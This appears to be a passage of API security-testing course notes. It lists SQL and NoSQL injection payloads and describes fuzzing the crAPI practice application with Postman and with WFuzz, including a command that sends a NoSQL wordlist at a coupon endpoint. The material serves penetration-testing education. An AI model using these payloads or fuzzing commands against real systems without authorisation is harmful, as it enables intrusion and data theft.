# Injection Vulnerabilities

Testing for Injection Vulnerabilities

### SQL Injection Meta-characters

```go
'
''
;%00
--
-- -
""
;
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1
```

### NoSQL Injection

```go
$gt
{"$gt":""}
{"$gt":-1}
$ne
{"$ne":""}
{"$ne":-1}
$nin
{"$nin":1}
{"$nin":[1]}
{"$where":"sleep(1000)"}
```

The provided lists include SQL injection metacharacters, NoSQL injection payloads, and OS injection characters commonly used to test for vulnerabilities.

### Fuzzing Wide with Postman

#### Injection Targets

1. PUT videos by id
2. GET videos by id
3. POST change-email
4. POST verify-email-token
5. POST login
6. GET location
7. POST check-otp
8. POST posts
9. POST validate-coupon
10. POST orders

Postman, with its Collection Runner, is used to test the entire API collection for injection vulnerabilities. The baseline is established by running the collection with well-formed requests and noting the responses. Fuzzing variables (e.g., \{{fuzz\}}) are added to targeted requests, and the collection is run again to observe any anomalies.

#### Fuzzing Deep with WFuzz

The process involves:

1. Duplicating the Burp Suite-captured request in a file.
2. Constructing a WFuzz attack command with payloads, headers, and data.
3. Executing WFuzz with the attack command.
4. Analyzing the results, filtering for successful attacks.

An example WFuzz command:

```bash
wfuzz -z file,usr/share/wordlists/nosqli -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d "{\"coupon_code\":FUZZ} http://crapi.apisec.ai/community/api/v2/coupon/validate-coupon" --sc 200
```

Successful injection attacks are identified by filtering responses with a status code of 200.

### Troubleshooting WFuzz Attacks

For troubleshooting WFuzz attacks, it's recommended to proxy traffic to Burp Suite using the `-p localhost:8080` option. This allows interception of requests in Burp Suite for detailed analysis and troubleshooting.\


![wfuzz request cli](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/file-uploads/site/2147573912/products/36a887-6ddf-2c-a507-742417c37c0\_injection24.PNG)

![Burp Request](https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/file-uploads/site/2147573912/products/e817b5-ced6-ab-8e70-63815edfca1\_injection25.PNG)

This comprehensive testing approach helps identify and exploit injection vulnerabilities in the API.
